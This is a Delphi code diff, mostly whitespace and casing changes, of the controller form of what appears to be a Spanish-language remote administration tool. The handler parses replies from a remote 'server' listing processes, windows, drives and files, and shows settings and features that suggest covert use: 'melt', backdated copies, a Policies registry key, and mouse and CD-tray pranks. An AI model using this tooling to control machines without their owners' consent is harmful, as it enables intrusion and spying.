+      vImgList := SHGetFileInfo(nil, FILE_ATTRIBUTE_NORMAL, vFileInfo, SizeOf(vFileInfo), SHGFI_ICON or SHGFI_SMALLICON or SHGFI_SYSICONINDEX);
+      SendMessage(listviewarchivos.Handle, LVM_SETIMAGELIST, LVSIL_SMALL, vImgList);
+      SendMessage(listviewBuscar.Handle, LVM_SETIMAGELIST, LVSIL_SMALL, vImgList);
+    end;
 
-    {Iconos grandes para thumbnails}
-    if primeravez then
+  {Iconos grandes para thumbnails}
+  if primeravez then
     begin
       numeroiconos := 0;
       IconosGrandes := TImageList.Create(nil);
-      IconosGrandes.width := 96;   {96x96, se puede cambiar si se desea}
-      IconosGrandes.height := 96;
+      IconosGrandes.Width := 96; {96x96, se puede cambiar si se desea}
+      IconosGrandes.Height := 96;
     end
-    else
+  else
     begin
       numeroiconos := 0;
       IconosGrandes.Clear;
     end;
 
-    for o := 0 to listviewarchivos.items.count-1 do //Para agregar los nuevo iconos que necesitemos
+  for o := 0 to listviewarchivos.Items.Count - 1 do //Para agregar los nuevo iconos que necesitemos
     begin
-      SHGetFileInfo(PChar(UpperCase(ExtractFileExt(listviewarchivos.items[o].caption))),FILE_ATTRIBUTE_NORMAL,fileinfo,SizeOf(FileInfo),SHGFI_ICON  or SHGFI_SYSICONINDEX or SHGFI_USEFILEATTRIBUTES);
+      SHGetFileInfo(PChar(UpperCase(ExtractFileExt(listviewarchivos.Items[o].Caption))), FILE_ATTRIBUTE_NORMAL, fileinfo, SizeOf(FileInfo), SHGFI_ICON or SHGFI_SYSICONINDEX or SHGFI_USEFILEATTRIBUTES);
     end;
 
-    TmpIconosGrandes := TImageList.Create(nil);  {Estos son de 32x32 y hay que redimensionarlos}
-    vImgList := SHGetFileInfo('',FILE_ATTRIBUTE_NORMAL,FileInfo,SizeOf(FileInfo),SHGFI_ICON or SHGFI_LARGEICON or SHGFI_SYSICONINDEX or  SHGFI_USEFILEATTRIBUTES);
-    DestroyIcon(FileInfo.hIcon);
-    TmpIconosGrandes.Handle := vImgList;
-    TmpIconosGrandes.ShareImages := true;
-    Tmp2IconosGrandes := TImageList.Create(nil);
-    Tmp2IconosGrandes.width := IconosGrandes.width;   {96x96, se puede cambiar si se desea}
-    Tmp2IconosGrandes.height := IconosGrandes.height;
-    for i:= 0 to TmpIconosGrandes.Count-1 do    //tenemos que redimensionar los iconos del sistema
+  TmpIconosGrandes := TImageList.Create(nil); {Estos son de 32x32 y hay que redimensionarlos}
+  vImgList := SHGetFileInfo('', FILE_ATTRIBUTE_NORMAL, FileInfo, SizeOf(FileInfo), SHGFI_ICON or SHGFI_LARGEICON or SHGFI_SYSICONINDEX or SHGFI_USEFILEATTRIBUTES);
+  DestroyIcon(FileInfo.hIcon);
+  TmpIconosGrandes.Handle := vImgList;
+  TmpIconosGrandes.ShareImages := True;
+  Tmp2IconosGrandes := TImageList.Create(nil);
+  Tmp2IconosGrandes.Width := IconosGrandes.Width; {96x96, se puede cambiar si se desea}
+  Tmp2IconosGrandes.Height := IconosGrandes.Height;
+  for i := 0 to TmpIconosGrandes.Count - 1 do //tenemos que redimensionar los iconos del sistema
     begin
       try
         //sleep(10);  //si no se pone este sleep algunas veces no cargan todos los iconos
-        bit := tbitmap.create();
-        nbit := tbitmap.create();
-        TmpIconosGrandes.GetBitmap(i,bit);
-        nbit.Width := Tmp2IconosGrandes.width;
-        nbit.Height := Tmp2IconosGrandes.height;
+        bit := tbitmap.Create();
+        nbit := tbitmap.Create();
+        TmpIconosGrandes.GetBitmap(i, bit);
+        nbit.Width := Tmp2IconosGrandes.Width;
+        nbit.Height := Tmp2IconosGrandes.Height;
 
-                                       //centramos el icono
-        tmpint := (nbit.height-bit.height) div 2;//"top" de la esquina sup izq
-        tmpint2 := (nbit.width-bit.width) div 2; //"left" de la esquina sup izq
-        StretchBlt(nBit.Canvas.Handle, tmpint2, tmpint, Bit.Width, Bit.Height, Bit.Canvas.Handle, 0, 0,Bit.Width, Bit.Height, SRCCOPY);
+        //centramos el icono
+        tmpint := (nbit.Height - bit.Height) div 2; //"top" de la esquina sup izq
+        tmpint2 := (nbit.Width - bit.Width) div 2; //"left" de la esquina sup izq
+        StretchBlt(nBit.Canvas.Handle, tmpint2, tmpint, Bit.Width, Bit.Height, Bit.Canvas.Handle, 0, 0, Bit.Width, Bit.Height, SRCCOPY);
 
-      Tmp2IconosGrandes.Add(nbit,nil);
+        Tmp2IconosGrandes.Add(nbit, nil);
       finally
-        bit.free;
-        nbit.free;
+        bit.Free;
+        nbit.Free;
         bit := nil;
         nbit := nil;
       end;
-  end;
-  IconosGrandes.Handle := Tmp2IconosGrandes.handle;
-   if primeravez then
+    end;
+  IconosGrandes.Handle := Tmp2IconosGrandes.Handle;
+  if primeravez then
     listviewarchivos.LargeImages := IconosGrandes;
 end;
 
 procedure TFormControl.OnRead(command: string; AThread: TIdPeerThread);
 var
   Recibido, TempStr: string;
-  Item:     TListItem;
-  i, a, o:     integer;
+  Item: TListItem;
+  i, a, o: Integer;
   RealSize: string;
-  itemv : TSearchItem;
+  itemv: TSearchItem;
 begin
   Recibido := Command;
-  // FormMain.Caption := Recibido; //Para debug
+  //FormMain.Caption := Recibido; //Para debug
+  //Application.MessageBox(PChar(Recibido), 'Para debug', MB_OK + MB_ICONINFORMATION); //Para debug
+
   if Recibido = 'CONNECTED?' then
     Exit;
   if Pos('CONNECTED?', Recibido) > 0 then
@@ -803,661 +807,677 @@ begin
   //Borra la String 'CONNECTED?'
 
   if Copy(Recibido, 1, 4) = 'PING' then
-  begin
-    if Servidor.Connection.Connected then
-      Servidor.Connection.Writeln('PONG');
-  end;
+    begin
+      if Servidor.Connection.Connected then
+        Servidor.Connection.Writeln('PONG');
+    end;
 
   if Copy(Recibido, 1, 4) = 'INFO' then
-  begin
-    Delete(Recibido, 1, 5);  //Borramos INFO|
-    for i := 0 to 9 do  //10 items
     begin
-      if i = 9 then  //Tamaño de los discos duros recibido en bytes
-        ListViewInformacion.Items[i].SubItems[0] :=
-          ObtenerMejorUnidad(StrToInt64(Copy(Recibido, 1, Pos('|', Recibido) - 1)))
-      else
-        ListViewInformacion.Items[i].SubItems[0] :=
-          Copy(Recibido, 1, Pos('|', Recibido) - 1);
-      Delete(Recibido, 1, Pos('|', Recibido));
+      Delete(Recibido, 1, 5); //Borramos INFO|
+      for i := 0 to 9 do //10 items
+        begin
+          if i = 9 then //Tamaño de los discos duros recibido en bytes
+            ListViewInformacion.Items[i].SubItems[0] :=
+              ObtenerMejorUnidad(StrToInt64(Copy(Recibido, 1, Pos('|', Recibido) - 1)))
+          else
+            ListViewInformacion.Items[i].SubItems[0] :=
+              Copy(Recibido, 1, Pos('|', Recibido) - 1);
+          Delete(Recibido, 1, Pos('|', Recibido));
+        end;
+      BtnRefrescarInformacion.Enabled := True;
     end;
-    BtnRefrescarInformacion.Enabled := true;
-  end;
 
   //Comandos relacionados con la gestión del servidor
   if Copy(Recibido, 1, 8) = 'SERVIDOR' then
-  begin
-    Delete(Recibido, 1, 9);
-    TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Saca el comando
-    Delete(Recibido, 1, Pos('|', Recibido));
-    //Información específica del servidor
-    if TempStr = 'INFO' then
     begin
-      with ListViewServidor do
-      begin
-        //Versión
-        Items[0].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
-        Delete(Recibido, 1, Pos('|', Recibido));
-        //Nombre
-        Items[1].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
-        Delete(Recibido, 1, Pos('|', Recibido));
-
-        Items[3].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
-        Delete(Recibido, 1, Pos('|', Recibido));
-
-        for i := 5 to 9 do
+      Delete(Recibido, 1, 9);
+      TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Saca el comando
+      Delete(Recibido, 1, Pos('|', Recibido));
+      //Información específica del servidor
+      if TempStr = 'INFO' then
         begin
-          //bCopiar, NombreDeArchivo, Copiar a, melt, CopiarConFechaAnterior
-          Items[i].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
-          Delete(Recibido, 1, Pos('|', Recibido));
-        end;
-        for i := 11 to 12 do
-        begin
-          //bPolicies, Nombre de la clave de Policies
-          Items[i].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
-          Delete(Recibido, 1, Pos('|', Recibido));
-        end;
-        for i := 14 to 15 do
-        begin
-          //bPolicies, Nombre de la clave de Policies
-          Items[i].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
-          Delete(Recibido, 1, Pos('|', Recibido));
-        end;
+          with ListViewServidor do
+            begin
+              //Versión
+              Items[0].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
+              Delete(Recibido, 1, Pos('|', Recibido));
+              //Nombre
+              Items[1].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
+              Delete(Recibido, 1, Pos('|', Recibido));
 
-        //Ruta del servidor
-        Items[17].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
-        Delete(Recibido, 1, Pos('|', Recibido));
-      end;
-      BtnActualizarServidorInfo.enabled := true;
+              Items[3].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
+              Delete(Recibido, 1, Pos('|', Recibido));
+
+              for i := 5 to 9 do
+                begin
+                  //bCopiar, NombreDeArchivo, Copiar a, melt, CopiarConFechaAnterior
+                  Items[i].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
+                  Delete(Recibido, 1, Pos('|', Recibido));
+                end;
+              for i := 11 to 12 do
+                begin
+                  //bPolicies, Nombre de la clave de Policies
+                  Items[i].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
+                  Delete(Recibido, 1, Pos('|', Recibido));
+                end;
+              for i := 14 to 15 do
+                begin
+                  //bPolicies, Nombre de la clave de Policies
+                  Items[i].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
+                  Delete(Recibido, 1, Pos('|', Recibido));
+                end;
+
+              //Ruta del servidor
+              Items[17].SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
+              Delete(Recibido, 1, Pos('|', Recibido));
+            end;
+          BtnActualizarServidorInfo.Enabled := True;
+        end;
     end;
-  end;
 
   //Listar Procesos
   if Copy(Recibido, 1, 4) = 'PROC' then
-  begin
-    ListViewProcesos.Clear;
-    Listviewprocesos.items.beginupdate;
-    Delete(Recibido, 1, 5);
-    while pos('|', Recibido) > 0 do
     begin
-      Item := Listviewprocesos.Items.Add;
-      Item.ImageIndex := 3; //imagen para que quede bonito XD
-      Item.Caption := Copy(Recibido, 1, Pos('|', Recibido) - 1);
-      Delete(Recibido, 1, Pos('|', Recibido));
-      Item.SubItems.Add(Copy(Recibido, 1, Pos('|', Recibido) - 1));
-      Delete(Recibido, 1, Pos('|', Recibido));
-      TempStr := Copy(recibido, 1, Pos('|', Recibido) - 1);
-      //De la ruta de los procesos quitamos \??\ y sustituimos \SystemRoot\ por %windir%\
-      TempStr := StringReplace(TempStr, '\??\', '', [rfReplaceAll]);
-      if Copy(TempStr, 1, 12) = '\SystemRoot\' then
-        TempStr := StringReplace(TempStr, '\SystemRoot\', '%windir%\', [rfReplaceAll]);
-      Item.SubItems.Add(TempStr);
-      Delete(Recibido, 1, Pos('|', Recibido));
+      ListViewProcesos.Clear;
+      Listviewprocesos.Items.beginupdate;
+      Delete(Recibido, 1, 5);
+      while Pos('|', Recibido) > 0 do
+        begin
+          Item := Listviewprocesos.Items.Add;
+          Item.ImageIndex := 3; //imagen para que quede bonito XD
+          Item.Caption := Copy(Recibido, 1, Pos('|', Recibido) - 1);
+          Delete(Recibido, 1, Pos('|', Recibido));
+          Item.SubItems.Add(Copy(Recibido, 1, Pos('|', Recibido) - 1));
+          Delete(Recibido, 1, Pos('|', Recibido));
+          TempStr := Copy(recibido, 1, Pos('|', Recibido) - 1);
+          //De la ruta de los procesos quitamos \??\ y sustituimos \SystemRoot\ por %windir%\
+          TempStr := StringReplace(TempStr, '\??\', '', [rfReplaceAll]);
+          if Copy(TempStr, 1, 12) = '\SystemRoot\' then
+            TempStr := StringReplace(TempStr, '\SystemRoot\', '%windir%\', [rfReplaceAll]);
+          Item.SubItems.Add(TempStr);
+          Delete(Recibido, 1, Pos('|', Recibido));
+        end;
+      listviewprocesos.Items.endupdate;
+      listviewprocesos.Width := listviewprocesos.Width + 1; //Para que desaparezca la scrollbar horizontal
+      listviewprocesos.Width := listviewprocesos.Width - 1;
+      BtnRefrescarProcesos.Enabled := True;
+      ListviewProcesos.Enabled := True;
+      Estado(_('Procesos listados'));
     end;
-    listviewprocesos.items.endupdate;
-    listviewprocesos.Width := listviewprocesos.Width+1;     //Para que desaparezca la scrollbar horizontal
-    listviewprocesos.Width := listviewprocesos.Width-1;
-    BtnRefrescarProcesos.Enabled := true;
-    ListviewProcesos.enabled := true;
-    Estado(_('Procesos listados'));
-  end;
   //Listar Ventanas
   if Copy(Recibido, 1, 4) = 'WIND' then
-  begin
-    ListViewVentanas.Clear;
-    Listviewventanas.Items.BeginUpdate;
-    Delete(Recibido, 1, 5);
-    while pos('|', Recibido) > 0 do
     begin
-      Item := ListViewVentanas.Items.Add;
-      Item.Caption := Copy(Recibido, 1, Pos('|', Recibido) - 1);        //titulo
-      Delete(Recibido, 1, Pos('|', Recibido));
-      Item.SubItems.Add(Copy(Recibido, 1, Pos('|', Recibido) - 1));     //handle
-      Delete(Recibido, 1, Pos('|', Recibido));
+      ListViewVentanas.Clear;
+      Listviewventanas.Items.BeginUpdate;
+      Delete(Recibido, 1, 5);
+      while Pos('|', Recibido) > 0 do
+        begin
+          Item := ListViewVentanas.Items.Add;
+          Item.Caption := Copy(Recibido, 1, Pos('|', Recibido) - 1); //titulo
+          Delete(Recibido, 1, Pos('|', Recibido));
+          Item.SubItems.Add(Copy(Recibido, 1, Pos('|', Recibido) - 1)); //handle
+          Delete(Recibido, 1, Pos('|', Recibido));
 
-      
-      case strtointdef(Copy(Recibido, 1, Pos('|', Recibido) - 1),4) of
-      0: begin item.ImageIndex := 65; Item.SubItems.Add(_('Oculta')); end;
-      1: begin item.ImageIndex := 61; Item.SubItems.Add(_('Maximizada')); end;
-      2: begin item.ImageIndex := 66; Item.SubItems.Add(_('Normal')); end;
-      3: begin item.ImageIndex := 64; Item.SubItems.Add(_('Minimizada')); end;
-      4: begin item.ImageIndex := 66; Item.SubItems.Add(_('Activa')); end;
-      end;
+          case StrToIntDef(Copy(Recibido, 1, Pos('|', Recibido) - 1), 4) of
+            0:
+              begin
+                item.ImageIndex := 65;
+                Item.SubItems.Add(_('Oculta'));
+              end;
+            1:
+              begin
+                item.ImageIndex := 61;
+                Item.SubItems.Add(_('Maximizada'));
+              end;
+            2:
+              begin
+                item.ImageIndex := 66;
+                Item.SubItems.Add(_('Normal'));
+              end;
+            3:
+              begin
+                item.ImageIndex := 64;
+                Item.SubItems.Add(_('Minimizada'));
+              end;
+            4:
+              begin
+                item.ImageIndex := 66;
+                Item.SubItems.Add(_('Activa'));
+              end;
+          end;
 
-      Delete(Recibido, 1, Pos('|', Recibido));
-    end;
+          Delete(Recibido, 1, Pos('|', Recibido));
+        end;
       Listviewventanas.Items.EndUpdate;
-      Listviewventanas.Width := Listviewventanas.Width+1;     //Para que desaparezca la scrollbar horizontal
-      Listviewventanas.Width := Listviewventanas.Width-1;
-      BtnRefrescarVentanas.Enabled := true;
-      CheckBoxMostrarVentanasOcultas.enabled := true;
-      ListViewVentanas.Enabled := true;
+      Listviewventanas.Width := Listviewventanas.Width + 1; //Para que desaparezca la scrollbar horizontal
+      Listviewventanas.Width := Listviewventanas.Width - 1;
+      BtnRefrescarVentanas.Enabled := True;
+      CheckBoxMostrarVentanasOcultas.Enabled := True;
+      ListViewVentanas.Enabled := True;
       Estado(_('Ventanas listadas'));
-  end;
+    end;
 
   //Ir a proceso...
   //Sintaxis: WINPROC|HandleDeLaVentana|PIDDelProcesoDueñoDeLaVentana
   if Copy(Recibido, 1, 7) = 'WINPROC' then
-  begin
-    Delete(Recibido, 1, 8);
-    //Mete en TempStr la handle
-    TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
-    Delete(Recibido, 1, Pos('|', Recibido));
-    if ListViewProcesos.Items.Count <= 0 then
-      MessageBoxw(Handle,
-        pwidechar(_('No se encontró ningún proceso listado. Debes actualizar la lista de procesos.')),
-        'Error', MB_ICONERROR + MB_OK);
-    if Recibido = '0' then
     begin
-      MessageBoxw(Handle,
-        pwidechar(_('No se encontró ningún proceso para la ventana. Es posible que el proceso ya haya sido cerrado.')
-        +
-        #13#10 + _('Actualice la lista de ventanas.')), 'Error', MB_ICONERROR + MB_OK);
-    end
-    else
-      for i := 0 to ListViewProcesos.Items.Count - 1 do
-      begin
-        if ListViewProcesos.Items[i].SubItems[0] = Recibido then
+      Delete(Recibido, 1, 8);
+      //Mete en TempStr la handle
+      TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
+      Delete(Recibido, 1, Pos('|', Recibido));
+      if ListViewProcesos.Items.Count <= 0 then
+        MessageBoxw(Handle,
+          pwidechar(_('No se encontró ningún proceso listado. Debes actualizar la lista de procesos.')),
+          'Error', MB_ICONERROR + MB_OK);
+      if Recibido = '0' then
         begin
-          Estado(
-            _('La ventana con handle ') + TempStr + _(' pertenece al proceso "') +
-            ListViewProcesos.Items[i].Caption + _('" con PID ') + Recibido + '.');
+          MessageBoxw(Handle,
+            pwidechar(_('No se encontró ningún proceso para la ventana. Es posible que el proceso ya haya sido cerrado.')
+            +
+            #13#10 + _('Actualice la lista de ventanas.')), 'Error', MB_ICONERROR + MB_OK);
+        end
+      else
+        for i := 0 to ListViewProcesos.Items.Count - 1 do
+          begin
+            if ListViewProcesos.Items[i].SubItems[0] = Recibido then
+              begin
+                Estado(
+                  _('La ventana con handle ') + TempStr + _(' pertenece al proceso "') +
+                  ListViewProcesos.Items[i].Caption + _('" con PID ') + Recibido + '.');
 
-          //Falso para asegurarse que se vea completamente el item
-          PageControlManagers.ActivePage := TabProcesos;
+                //Falso para asegurarse que se vea completamente el item
+                PageControlManagers.ActivePage := TabProcesos;
 
-          PageControlManagers.SetFocus;
-          ListViewProcesos.SetFocus;
-          ListViewProcesos.Items[i].MakeVisible(false);
-          ListViewProcesos.Items[i].Selected := True;
-          ListViewProcesos.Items[i].Focused  := True;
-           ListViewProcesos.SetFocus;
-          //Para que aparezca automaticamente seleccionado en la ventana
-          Break;
-        end;
-      end;
-  end;
+                PageControlManagers.SetFocus;
+                ListViewProcesos.SetFocus;
+                ListViewProcesos.Items[i].MakeVisible(False);
+                ListViewProcesos.Items[i].Selected := True;
+                ListViewProcesos.Items[i].Focused := True;
+                ListViewProcesos.SetFocus;
+                //Para que aparezca automaticamente seleccionado en la ventana
+                Break;
+              end;
+          end;
+    end;
 
   //Mostrar Mensaje en la StatusBar
   if Copy(Recibido, 1, 3) = 'MSG' then
-  begin
-    Delete(Recibido, 1, 4);
-    for i := 0 to 55 do
-      Recibido := StringReplace(Recibido,'{'+inttostr(i)+'}',MSGPosibles[i],[rfReplaceAll]);
-
-    if Recibido = _('El directorio no existe!') then
     begin
-      EditPathArchivos.Text :=
-        Copy(EditPathArchivos.Text, 1, Length(EditPathArchivos.Text) - 1); //Borra el ultimo '\'
-      EditPathArchivos.Text :=
-        Copy(EditPathArchivos.Text, 1, LastDelimiter('\', EditPathArchivos.Text));
-      BtnActualizarArchivos.enabled := true;
-      ListviewArchivos.enabled := True;
-      CmbUnidades.enabled := True;
-      SpeedbuttonRutasRapidas.enabled := True;
-    end;
-    Estado(Recibido);
+      Delete(Recibido, 1, 4);
+      for i := 0 to 55 do
+        Recibido := StringReplace(Recibido, '{' + IntToStr(i) + '}', MSGPosibles[i], [rfReplaceAll]);
 
-  end;
+      if Recibido = _('El directorio no existe!') then
+        begin
+          EditPathArchivos.Text :=
+            Copy(EditPathArchivos.Text, 1, Length(EditPathArchivos.Text) - 1); //Borra el ultimo '\'
+          EditPathArchivos.Text :=
+            Copy(EditPathArchivos.Text, 1, LastDelimiter('\', EditPathArchivos.Text));
+          BtnActualizarArchivos.Enabled := True;
+          ListviewArchivos.Enabled := True;
+          CmbUnidades.Enabled := True;
+          SpeedbuttonRutasRapidas.Enabled := True;
+        end;
+      Estado(Recibido);
+
+    end;
 
   if Copy(Recibido, 1, 15) = 'MOUSETEMBLOROSO' then
-  begin
-    Delete(Recibido, 1, 16); //Borra 'MOUSETEMBLOROSO|' de la string
-    ListViewBromas.Items[0].SubItems[0] := Recibido;
-    //0 porque es el primero en la ListViewBromas
-  end;
+    begin
+      Delete(Recibido, 1, 16); //Borra 'MOUSETEMBLOROSO|' de la string
+      ListViewBromas.Items[0].SubItems[0] := Recibido;
+      //0 porque es el primero en la ListViewBromas
+    end;
   if Copy(Recibido, 1, 13) = 'CONGELARMOUSE' then
-  begin
-    Delete(Recibido, 1, 14); //Borra 'CONGELARMOUSE|' de la string
-    ListViewBromas.Items[1].SubItems[0] := Recibido;
-  end;
+    begin
+      Delete(Recibido, 1, 14); //Borra 'CONGELARMOUSE|' de la string
+      ListViewBromas.Items[1].SubItems[0] := Recibido;
+    end;
   if Copy(Recibido, 1, 7) = 'ABRIRCD' then
-  begin
-    Delete(Recibido, 1, 8); //Borra ''ABRIRCD|' de la string
-    ListViewBromas.Items[2].SubItems[0] := Recibido;
-  end;
+    begin
+      Delete(Recibido, 1, 8); //Borra ''ABRIRCD|' de la string
+      ListViewBromas.Items[2].SubItems[0] := Recibido;
+    end;
   if Copy(Recibido, 1, 16) = 'MATARBOTONINICIO' then
-  begin
-    Delete(Recibido, 1, 17); //Borra 'MATARBOTONINICIO|' de la string
-    ListViewBromas.Items[3].SubItems[0] := Recibido;
-  end;
+    begin
+      Delete(Recibido, 1, 17); //Borra 'MATARBOTONINICIO|' de la string
+      ListViewBromas.Items[3].SubItems[0] := Recibido;
+    end;
 
   if Copy(Recibido, 1, 11) = 'VERUNIDADES' then
-  begin
-    Delete(Recibido, 1, 12); //Borra 'VERUNIDADES|' de la string
-    cmbUnidades.Items.Clear;
-    while Pos('|', Recibido) > 1 do
-      //Mayor que 1 porque hay un '|' al final de la cadena que se desprecia
     begin
-      TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));  //Unidad
-      Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
-      TempStr := TempStr + ' ' + Copy(Recibido, 1, (Pos('|', Recibido) - 1));  //Nombre
-      Delete(Recibido, 1, Pos('|', Recibido));
+      Delete(Recibido, 1, 12); //Borra 'VERUNIDADES|' de la string
+      cmbUnidades.Items.Clear;
+      while Pos('|', Recibido) > 1 do
+        //Mayor que 1 porque hay un '|' al final de la cadena que se desprecia
+        begin
+          TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1)); //Unidad
+          Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
+          TempStr := TempStr + ' ' + Copy(Recibido, 1, (Pos('|', Recibido) - 1)); //Nombre
+          Delete(Recibido, 1, Pos('|', Recibido));
 
-      TempStr := TempStr + ' - '+_('Espacio libre/total: ') +
-        ObtenerMejorUnidad(StrToInt64(Copy(Recibido, 1, (Pos('|', Recibido) - 1))));
-      //Espacio disponible
-      Delete(Recibido, 1, Pos('|', Recibido));
-      TempStr := TempStr + ' / ' +
-        ObtenerMejorUnidad(StrToInt64(Copy(Recibido, 1, (Pos('|', Recibido) - 1))));
-      //Espacio total
-      Delete(Recibido, 1, Pos('|', Recibido));
-      TempStr := TempStr + ' - '+_('Formato:')+' ' + Copy(Recibido, 1, (Pos('|', Recibido) - 1));
-      //Formato
-      Delete(Recibido, 1, Pos('|', Recibido));
-      case StrToInt(Copy(Recibido, 1, (Pos('|', Recibido) - 1))) of //el último caracter
-        0: TempStr := TempStr + _(' - Unidad desconocida');
-        2: TempStr := TempStr + _(' - Unidad removible');
-        3: TempStr := TempStr + _(' - Disco duro');
-        4: TempStr := TempStr + _(' - Disco de red');
-        5: TempStr := TempStr + _(' - Unidad de CD/DVD');
-        6: TempStr := TempStr + _(' - Disc RAM');
-      end;
-      cmbUnidades.Items.Add(TempStr);
-      Delete(Recibido, 1, Pos('|', Recibido));
+          TempStr := TempStr + ' - ' + _('Espacio libre/total: ') +
+            ObtenerMejorUnidad(StrToInt64(Copy(Recibido, 1, (Pos('|', Recibido) - 1))));
+          //Espacio disponible
+          Delete(Recibido, 1, Pos('|', Recibido));
+          TempStr := TempStr + ' / ' +
+            ObtenerMejorUnidad(StrToInt64(Copy(Recibido, 1, (Pos('|', Recibido) - 1))));
+          //Espacio total
+          Delete(Recibido, 1, Pos('|', Recibido));
+          TempStr := TempStr + ' - ' + _('Formato:') + ' ' + Copy(Recibido, 1, (Pos('|', Recibido) - 1));
+          //Formato
+          Delete(Recibido, 1, Pos('|', Recibido));
+          case StrToInt(Copy(Recibido, 1, (Pos('|', Recibido) - 1))) of //el último caracter
+            0: TempStr := TempStr + _(' - Unidad desconocida');
+            2: TempStr := TempStr + _(' - Unidad removible');
+            3: TempStr := TempStr + _(' - Disco duro');
+            4: TempStr := TempStr + _(' - Disco de red');
+            5: TempStr := TempStr + _(' - Unidad de CD/DVD');
+            6: TempStr := TempStr + _(' - Disc RAM');
+          end;
+          cmbUnidades.Items.Add(TempStr);
+          Delete(Recibido, 1, Pos('|', Recibido));
+        end;
+      cmbUnidades.Enabled := True;
+      EditPathArchivos.Enabled := True;
+      BtnActualizarArchivos.Enabled := True;
+      ListviewArchivos.Enabled := True;
+      SpeedbuttonRutasRapidas.Enabled := True;
+      Estado(_('Unidades listadas.'));
+      BtnVerUnidades.Enabled := True;
     end;
-    cmbUnidades.Enabled      := True;
-    EditPathArchivos.Enabled := True;
-    BtnActualizarArchivos.Enabled := True;
-    ListviewArchivos.enabled := True;
-    SpeedbuttonRutasRapidas.enabled := true;
-    Estado(_('Unidades listadas.'));
-    BtnVerUnidades.Enabled := True;
-  end;
 
   if Copy(Recibido, 1, 14) = 'LISTARARCHIVOS' then
-  begin
-    Delete(Recibido, 1, 15); //Borra 'LISTARARCHIVOS|'
-    Delete(Recibido, 1, Pos('|', Recibido));
-
-    ListViewArchivos.Items.BeginUpdate;
-    ListViewArchivos.Clear; //Limpia primero...
-    if Length(EditPathArchivos.Text) > 3 then
     begin
-      Item := ListViewArchivos.Items.Add;
-      Item.ImageIndex := 3;
-      Item.Caption := '<..>';
-    end;
-    Estado(_('Listando directorio: ')+EditPathArchivos.text);
-    while Pos('|', Recibido) > 1 do
-    begin
-      if ParaDeListar then break;
-      TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
-      Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
-      if TempStr[1] = #2 then //entonces le llegó una carpeta
-      begin
-        Delete(TempStr, 1, 1); //borra el #2
-        Item := ListViewArchivos.Items.Add;
-        Item.ImageIndex := 3; //1 es el icono de carpeta cerrada
-        Item.Caption := Copy(TempStr, 1, Pos(':', TempStr) - 1);
-        Delete(TempStr, 1, Pos(':', Tempstr));
+      Delete(Recibido, 1, 15); //Borra 'LISTARARCHIVOS|'
+      Delete(Recibido, 1, Pos('|', Recibido));
 
-        Item.SubItems.Add('');
-        Item.SubItems.Add(_('Carpeta de archivos'));
-        Item.SubItems.Add(Copy(TempStr, 1, Pos(':', TempStr) - 1));
-        
-        Item.SubItems.add(
-         DateToStr(FileDateToDateTime(strtointdef(Copy(TempStr, Pos(':', TempStr) + 1, Length(TempStr)),1))) + ' ' +
-         TimeToStr(FileDateToDateTime(strtointdef(Copy(TempStr, Pos(':', TempStr) + 1, Length(TempStr)),1)))
-         );
-        a := a + 1; //numero de carpetas
-      end
-      else //entonces es un archivo, saque tambien la información extra...
-      begin
-        Item    := ListViewArchivos.Items.Add;
-        Item.ImageIndex := IconNum(TempStr, true);
-        Item.Caption := TempStr;
-
-        if((AnsiLowerCase(tempstr) = 'thumbs.db') and PrevisualizacionActiva and not receivingthumbfile) then
+      ListViewArchivos.Items.BeginUpdate;
+      ListViewArchivos.Clear; //Limpia primero...
+      if Length(EditPathArchivos.Text) > 3 then
         begin
-          Receivingthumbfile := true;
-          if Servidor.Connection.connected then
-            Servidor.Connection.Writeln('GETFILE|'+EditPathArchivos.text+tempstr);
+          Item := ListViewArchivos.Items.Add;
+          Item.ImageIndex := 3;
+          Item.Caption := '<..>';
         end;
+      Estado(_('Listando directorio: ') + EditPathArchivos.Text);
+      while Pos('|', Recibido) > 1 do
+        begin
+          if ParaDeListar then break;
+          TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
+          Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
+          if TempStr[1] = #2 then //entonces le llegó una carpeta
+            begin
+              Delete(TempStr, 1, 1); //borra el #2
+              Item := ListViewArchivos.Items.Add;
+              Item.ImageIndex := 3; //1 es el icono de carpeta cerrada
+              Item.Caption := Copy(TempStr, 1, Pos(':', TempStr) - 1);
+              Delete(TempStr, 1, Pos(':', Tempstr));
 
-        TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
-        Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
-        Item.SubItems.Add(ObtenerMejorUnidad(StrToInt(TempStr)));
-        RealSize := TempStr;
-        TempStr  := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
-        Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
-        Item.SubItems.Add({TempStr}'Archivo'); //agrega el tipo
-        TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
